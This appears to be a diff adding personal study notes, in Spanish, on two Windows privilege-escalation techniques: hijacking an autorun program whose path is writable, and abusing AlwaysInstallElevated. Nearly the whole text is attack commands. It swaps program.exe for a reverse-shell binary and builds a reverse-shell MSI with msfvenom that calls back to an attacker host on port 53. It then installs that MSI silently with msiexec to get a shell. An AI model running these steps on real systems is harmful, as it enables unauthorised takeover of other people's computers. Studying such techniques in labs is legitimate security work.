@@ -1,0 +1,37 @@
+
+1.-Autoruns-Task
+
+	> reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
+
+	Fijarse en los programas que aparecen de abajo a arriba "usr"
+
+	Buscamos por si podemos escribir en la ruta
+	> .\accesschk.exe /accepteula -wvu "C:\Program Files\Autorun Program\program.exe"
+	Si podemos --> RW Everyone 
+			FILE_ALL_ACCESS
+		   --> RW BUILTIN\Users
+			FILE_ALL_ACCESS
+
+	Procedemos a copiar nuestra rev.exe a la ruta y sustituirlo por program.exe
+	> copy C:\Privesc\rev.exe "C:Program Files\Autorun Program\program.exe"
+
+	Una vez hecho procedemos a "Reiniciar Windows" -- Nos ponemos a la escucha
+	Conseguimos la Shell
+
+2.- AlwaysInstallElevated
+
+	EL "AlwaysInstallElevated" debe estar seteado a 1 en los dos casos de la maquina Local
+
+	> winPEAS.exe quiet windowscreds
+
+	Procedemos a crear una nueva Reverse Shell .msi
+	> msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.233.133 LPORT=53 -f msi -o rev.msi
+
+	Cuando ya lo tenemos en el PC WINDOWS procedemos a ejecutarlo
+	> copy \\IP\smbFolder\rev.msi C:\Privesc
+	
+	Ejecucion
+	> msiexec /quiet /wn /i rev.msi	
+ 	
+	Conseguimos la SHELL 
+
